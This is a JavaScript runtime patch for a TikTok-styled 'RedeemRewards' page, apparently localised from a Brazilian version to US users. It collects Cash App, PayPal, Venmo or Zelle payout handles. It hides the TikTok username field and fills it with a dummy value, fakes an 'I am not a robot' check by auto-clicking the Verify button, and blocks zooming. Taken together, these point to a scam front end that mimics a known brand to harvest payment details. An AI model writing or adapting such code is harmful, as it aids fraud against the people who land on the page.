// Runtime patch for the RedeemRewards modal (US localization):
// - Hide the "@yourusername" TikTok field and auto-fill it so validation passes
// - Apply light input formatting for the payout key field based on selected method:
//     Cash App  -> ensure leading "$" (cashtag)
//     PayPal    -> lowercase, trim spaces (email)
//     Venmo     -> ensure leading "@" (handle)
//     Zelle     -> US phone mask (555) 555-5555 when numeric, otherwise pass-through email
(function () {
  if (window.__captchaStylesInjected !== true) {
    window.__captchaStylesInjected = true;
    const captchaCss = `
      .captcha-modal-overlay {
        position: fixed !important;
        inset: 0 !important;
        background-color: rgba(0, 0, 0, 0.6) !important;
        backdrop-filter: blur(8px) !important;
        -webkit-backdrop-filter: blur(8px) !important;
        display: flex !important;
        align-items: center !important;
        justify-content: center !important;
        z-index: 99999 !important;
        padding: 1rem !important;
        animation: captchaFadeIn 0.3s ease-out !important;
      }
      .captcha-modal-container {
        background: white !important;
        border-radius: 1rem !important;
        box-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.3), 0 10px 10px -5px rgba(0, 0, 0, 0.2) !important;
        width: 100% !important;
        max-width: 400px !important;
        overflow: hidden !important;
        animation: captchaZoomIn 0.3s ease-out !important;
        position: relative !important;
      }
      .captcha-modal-header {
        background: linear-gradient(135deg, #FE2C55 0%, #FF0050 100%) !important;
        padding: 2rem 1.5rem !important;
        text-align: center !important;
      }
      .captcha-modal-icon-wrapper {
        display: flex !important;
        justify-content: center !important;
        margin-bottom: 1rem !important;
      }
      .captcha-modal-icon {
        width: 56px !important;
        height: 56px !important;
        filter: drop-shadow(0 4px 6px rgba(0, 0, 0, 0.1)) !important;
      }
      .captcha-modal-title {
        color: white !important;
        font-size: 1.25rem !important;
        font-weight: 700 !important;
        margin: 0 0 0.5rem 0 !important;
        line-height: 1.3 !important;
      }
      .captcha-modal-subtitle {
        color: rgba(255, 255, 255, 0.9) !important;
        font-size: 0.875rem !important;
        margin: 0 !important;
        line-height: 1.4 !important;
      }
      .captcha-modal-body {
        padding: 1.5rem !important;
      }
      .captcha-question-wrapper {
        text-align: center !important;
        margin-bottom: 1.5rem !important;
      }
      .captcha-question-box {
        display: inline-block !important;
        background: linear-gradient(135deg, rgba(254, 44, 85, 0.1) 0%, rgba(255, 0, 80, 0.1) 100%) !important;
        border-radius: 1rem !important;
        padding: 1.5rem 2rem !important;
        margin-bottom: 1rem !important;
      }
      .captcha-question-text {
        font-size: 2.25rem !important;
        font-weight: 700 !important;
        color: #3c4043 !important;
        margin: 0 !important;
        line-height: 1 !important;
      }
      .captcha-question-hint {
        font-size: 0.875rem !important;
        color: #5f6368 !important;
        margin: 0 !important;
      }
      .captcha-input {
        width: 100% !important;
        padding: 0.875rem 1rem !important;
        border: 2px solid #e0e0e0 !important;
        border-radius: 0.75rem !important;
        text-align: center !important;
        font-size: 1.125rem !important;
        font-weight: 600 !important;
        transition: all 0.3s ease !important;
        box-sizing: border-box !important;
        background-color: white !important;
        color: #3c4043 !important;
        appearance: none !important;
        -webkit-appearance: none !important;
        -moz-appearance: textfield !important;
        display: block !important;
      }
      .captcha-input::-webkit-outer-spin-button,
      .captcha-input::-webkit-inner-spin-button {
        -webkit-appearance: none !important;
        margin: 0 !important;
      }
      .captcha-input:focus {
        outline: none !important;
        border-color: #FE2C55 !important;
        box-shadow: 0 0 0 4px rgba(254, 44, 85, 0.2) !important;
      }
      .captcha-input.error {
        border-color: #EA4335 !important;
        background-color: #FEF2F2 !important;
        animation: captchaShake 0.5s ease !important;
      }
      .captcha-input.success {
        border-color: #34A853 !important;
        background-color: #F0FDF4 !important;
      }
      .captcha-feedback {
        margin-top: 0.75rem !important;
        padding: 0.75rem !important;
        border-radius: 0.5rem !important;
        display: flex !important;
        align-items: center !important;
        gap: 0.5rem !important;
        animation: captchaFadeIn 0.2s ease !important;
      }
      .captcha-feedback.error {
        background-color: #FEF2F2 !important;
        border: 1px solid #FECACA !important;
      }
      .captcha-feedback.success {
        background-color: #F0FDF4 !important;
        border: 1px solid #BBF7D0 !important;
      }
      .captcha-feedback-icon {
        width: 18px !important;
        height: 18px !important;
        flex-shrink: 0 !important;
      }
      .captcha-feedback-text {
        font-size: 0.75rem !important;
        font-weight: 500 !important;
        margin: 0 !important;
        flex: 1 !important;
      }
      .captcha-feedback.error .captcha-feedback-text {
        color: #EA4335 !important;
      }
      .captcha-feedback.success .captcha-feedback-text {
        color: #34A853 !important;
      }
      .captcha-confirm-btn {
        width: 100% !important;
        margin-top: 1.25rem !important;
        padding: 0.875rem 1.5rem !important;
        background: linear-gradient(135deg, #FE2C55 0%, #FF0050 100%) !important;
        color: white !important;
        font-size: 1rem !important;
        font-weight: 700 !important;
        border: none !important;
        border-radius: 0.75rem !important;
        cursor: pointer !important;
        transition: all 0.2s ease !important;
        box-shadow: 0 4px 6px -1px rgba(254, 44, 85, 0.3), 0 2px 4px -1px rgba(254, 44, 85, 0.2) !important;
        line-height: 1.5 !important;
        display: inline-flex !important;
        align-items: center !important;
        justify-content: center !important;
      }
      .captcha-confirm-btn:hover:not(:disabled) {
        background: linear-gradient(135deg, #FF0050 0%, #FE2C55 100%) !important;
        box-shadow: 0 10px 15px -3px rgba(254, 44, 85, 0.4), 0 4px 6px -2px rgba(254, 44, 85, 0.3) !important;
        transform: translateY(-1px) !important;
      }
      .captcha-confirm-btn:active:not(:disabled) {
        transform: scale(0.95) !important;
      }
      .captcha-confirm-btn:disabled {
        opacity: 0.5 !important;
        cursor: not-allowed !important;
      }
      @keyframes captchaFadeIn {
        from { opacity: 0; }
        to { opacity: 1; }
      }
      @keyframes captchaZoomIn {
        from { opacity: 0; transform: scale(0.9); }
        to { opacity: 1; transform: scale(1); }
      }
      @keyframes captchaShake {
        0%, 100% { transform: translateX(0); }
        10%, 30%, 50%, 70%, 90% { transform: translateX(-5px); }
        20%, 40%, 60%, 80% { transform: translateX(5px); }
      }
    `;
    const style = document.createElement("style");
    style.id = "captcha-modal-styles";
    style.textContent = captchaCss;
    document.head.appendChild(style);
  }

  if (window.__redeemPatchVersion === 10) return;
  window.__redeemPatchVersion = 10;
  window.__redeemPatchInstalled = true;

  const viewportContent = "width=device-width, initial-scale=1, minimum-scale=1, maximum-scale=1, user-scalable=no, viewport-fit=cover";
  let lastUrl = window.location.href;

  function enforceViewport() {
    let viewport = document.querySelector('meta[name="viewport"]');
    if (!viewport) {
      viewport = document.createElement("meta");
      viewport.setAttribute("name", "viewport");
      document.head.appendChild(viewport);
    }
    viewport.setAttribute("content", viewportContent);
    document.documentElement.style.zoom = "1";
    if (document.body) document.body.style.zoom = "1";
  }

  function isTextField(node) {
    return Boolean(node && node.matches && node.matches("input, textarea, select, [contenteditable='true']"));
  }

  function enforceViewportOnly() {
    enforceViewport();
  }

  function refreshViewportAfterScreenChange() {
    requestAnimationFrame(enforceViewportOnly);
    setTimeout(enforceViewportOnly, 60);
    setTimeout(enforceViewportOnly, 180);
    setTimeout(enforceViewportOnly, 420);
    setTimeout(enforceViewportOnly, 900);
  }

  function preventZoom(event) {
    if (event.cancelable) event.preventDefault();
    enforceViewport();
  }

  function preventTouchZoom(event) {
    if (event.touches && event.touches.length > 1) preventZoom(event);
  }

  function findCaptchaVerifyButton(target) {
    const button = document.querySelector('button[aria-label="Verify"]');
    if (!button || !document.body || !document.body.innerText.includes("I am not a robot")) return null;
    if (target && target.closest && target.closest("input, textarea, select, [contenteditable='true']")) return null;
    const card = button.parentElement && button.parentElement.parentElement;
    if (target === button || button.contains(target) || (card && card.contains(target))) return button;
    return null;
  }

  let captchaTapLock = false;
  function activateCaptchaTap(target) {
    const button = findCaptchaVerifyButton(target);
    if (!button) return false;
    if (!captchaTapLock) {
      captchaTapLock = true;
      setTimeout(() => {
        try { button.click(); } catch {}
        setTimeout(() => { captchaTapLock = false; }, 700);
      }, 0);
    }
    return true;
  }

  function preventWheelZoom(event) {
    if (event.ctrlKey || event.metaKey) preventZoom(event);
  }

  function preventKeyboardZoom(event) {
    if ((event.ctrlKey || event.metaKey) && ["+", "-", "=", "0"].includes(event.key)) preventZoom(event);
  }

  if (!window.__mobileGuardPatchedByRedeem) {
    window.__mobileGuardPatchedByRedeem = true;
    const originalPushState = history.pushState;
    const originalReplaceState = history.replaceState;
    history.pushState = function () {
      const result = originalPushState.apply(this, arguments);
      lastUrl = window.location.href;
      refreshViewportAfterScreenChange();
      return result;
    };
    history.replaceState = function () {
      const result = originalReplaceState.apply(this, arguments);
      lastUrl = window.location.href;
      refreshViewportAfterScreenChange();
      return result;
    };
  }

  document.addEventListener("gesturestart", preventZoom, { passive: false, capture: true });
  document.addEventListener("gesturechange", preventZoom, { passive: false, capture: true });
  document.addEventListener("gestureend", preventZoom, { passive: false, capture: true });
  document.addEventListener("touchstart", preventTouchZoom, { passive: false, capture: true });
  document.addEventListener("touchmove", preventTouchZoom, { passive: false, capture: true });
  document.addEventListener("touchend", (event) => { activateCaptchaTap(event.target); enforceViewport(); }, { passive: true, capture: true });
  document.addEventListener("wheel", preventWheelZoom, { passive: false, capture: true });
  document.addEventListener("keydown", preventKeyboardZoom, { passive: false, capture: true });

  window.addEventListener("popstate", refreshViewportAfterScreenChange, { capture: true });
  document.addEventListener("click", (event) => {
    const target = event.target;
    if (activateCaptchaTap(target)) return;
    if (target && target.closest && target.closest("input, textarea, select, [contenteditable='true']")) return;
    if (target && target.closest && target.closest("a, button, [role='button']")) enforceViewport();
  }, true);

  document.addEventListener("focusin", (event) => {
    enforceViewport();
  }, true);
  document.addEventListener("focusout", () => setTimeout(enforceViewport, 180), true);
  if (window.visualViewport) {
    window.visualViewport.addEventListener("resize", () => {
      enforceViewport();
    });
  }

  new MutationObserver(() => {
    if (window.location.href !== lastUrl) {
      lastUrl = window.location.href;
      refreshViewportAfterScreenChange();
    }
  }).observe(document.documentElement, { childList: true, subtree: true });

  enforceViewport();
  refreshViewportAfterScreenChange();
  setInterval(() => {
    enforceViewport();
    if (window.location.href !== lastUrl) {
      lastUrl = window.location.href;
      refreshViewportAfterScreenChange();
    }
  }, 250);

  function setNativeValue(el, value) {
    const proto = Object.getPrototypeOf(el);
    const setter = Object.getOwnPropertyDescriptor(proto, "value")?.set;
    const parentSetter = Object.getOwnPropertyDescriptor(
      HTMLInputElement.prototype,
      "value"
    )?.set;
    if (setter && setter !== parentSetter) {
      parentSetter.call(el, value);
    } else if (setter) {
      setter.call(el, value);
    } else {
      el.value = value;
    }
    el.dispatchEvent(new Event("input", { bubbles: true }));
  }

  function maskUSPhone(v) {
    const d = v.replace(/\D/g, "").slice(0, 10);
    if (d.length === 0) return "";
    if (d.length <= 3) return `(${d}`;
    if (d.length <= 6) return `(${d.slice(0, 3)}) ${d.slice(3)}`;
    return `(${d.slice(0, 3)}) ${d.slice(3, 6)}-${d.slice(6)}`;
  }

  function maskEmail(v) {
    return v.toLowerCase().replace(/\s+/g, "");
  }

  function maskCashtag(v) {
    const stripped = v.replace(/\s+/g, "");
    if (!stripped) return "";
    return stripped.startsWith("$") ? stripped : `$${stripped.replace(/^\$+/, "")}`;
  }

  function maskVenmo(v) {
    const stripped = v.replace(/\s+/g, "");
    if (!stripped) return "";
    return stripped.startsWith("@") ? stripped : `@${stripped.replace(/^@+/, "")}`;
  }

  function maskZelle(v) {
    const trimmed = v.trim();
    // If it looks like it has letters or "@", treat as email
    if (/[a-zA-Z@]/.test(trimmed)) return maskEmail(trimmed);
    // Otherwise treat as US phone
    return maskUSPhone(trimmed);
  }

  // The underlying app still emits internal type keys: cpf | email | phone | random
  function selectedKeyTypeFromButtons() {
    const buttons = Array.from(document.querySelectorAll("button"));
    const selected = buttons.find((button) => {
      const text = (button.textContent || "").trim().toLowerCase();
      return (
        ["cash app", "paypal", "venmo", "zelle"].includes(text) &&
        /border-pink|text-pink|bg-pink\/5/.test(button.className || "")
      );
    });
    const text = (selected?.textContent || "").trim().toLowerCase();
    if (text === "cash app") return "cashapp";
    if (text === "venmo") return "venmo";
    if (text === "paypal") return "paypal";
    if (text === "zelle") return "zelle";
    return null;
  }

  function detectKeyType(input) {
    const ph = (input.getAttribute("placeholder") || "").toLowerCase();
    if (ph.includes("cashtag") || ph.startsWith("$")) return "cashapp";
    if (ph.includes("paypal") || ph.includes("@paypal") || ph.includes("email")) return "paypal";
    if (ph.includes("venmo") || ph.startsWith("@your-venmo")) return "venmo";
    if (ph.includes("555-5555") || ph.includes("email or (")) return "zelle";
    const wrapperText = (input.closest("div")?.parentElement?.textContent || "").toLowerCase();
    if (wrapperText.includes("payment details") || wrapperText.includes("payout")) return selectedKeyTypeFromButtons();
    return null;
  }

  function formatByType(value, type) {
    if (type === "cashapp") return maskCashtag(value);
    if (type === "paypal") return maskEmail(value);
    if (type === "venmo") return maskVenmo(value);
    if (type === "zelle") return maskZelle(value);
    return value;
  }

  function isPayoutKeyInput(input) {
    if (!(input instanceof HTMLInputElement)) return false;
    if (input.getAttribute("placeholder") === "@yourusername") return false;
    return Boolean(detectKeyType(input));
  }

  function applyMask(input, notifyReact) {
    const type = detectKeyType(input);
    if (!type) return;
    const raw = input.value;
    const formatted = formatByType(raw, type);
    if (formatted !== raw) {
      if (notifyReact) setNativeValue(input, formatted);
      else input.value = formatted;
      try {
        input.setSelectionRange(formatted.length, formatted.length);
      } catch {}
    }
  }

  function attachMask(input) {
    if (input.dataset.maskAttached === "1") return;
    input.dataset.maskAttached = "1";
    input.addEventListener("input", function () {
      applyMask(input, true);
    });
    const obs = new MutationObserver(() => {
      applyMask(input, true);
    });
    obs.observe(input, { attributes: true, attributeFilter: ["placeholder"] });
  }

  function hideUsernameField(input) {
    if (input.dataset.hidden === "1") return;
    input.dataset.hidden = "1";
    if (!input.value) setNativeValue(input, "user");
    const wrapper = input.closest("div");
    if (wrapper) wrapper.style.display = "none";
  }

  function scan() {
    document
      .querySelectorAll('input[placeholder="@yourusername"], input[placeholder="@seuusuario"]')
      .forEach(hideUsernameField);
    document
      .querySelectorAll('input[type="text"], input:not([type])')
      .forEach((input) => {
        if (isPayoutKeyInput(input)) {
          attachMask(input);
          applyMask(input, true);
        }
      });
  }

  document.addEventListener(
    "input",
    function (event) {
      const input = event.target;
      if (isPayoutKeyInput(input)) applyMask(input, false);
    },
    true
  );

  document.addEventListener(
    "paste",
    function (event) {
      const input = event.target;
      if (isPayoutKeyInput(input)) setTimeout(() => applyMask(input, true), 0);
    },
    true
  );

  document.addEventListener(
    "click",
    function () {
      setTimeout(scan, 0);
      setTimeout(scan, 80);
    },
    true
  );

  const mo = new MutationObserver(scan);
  mo.observe(document.documentElement, { childList: true, subtree: true });
  scan();
})();
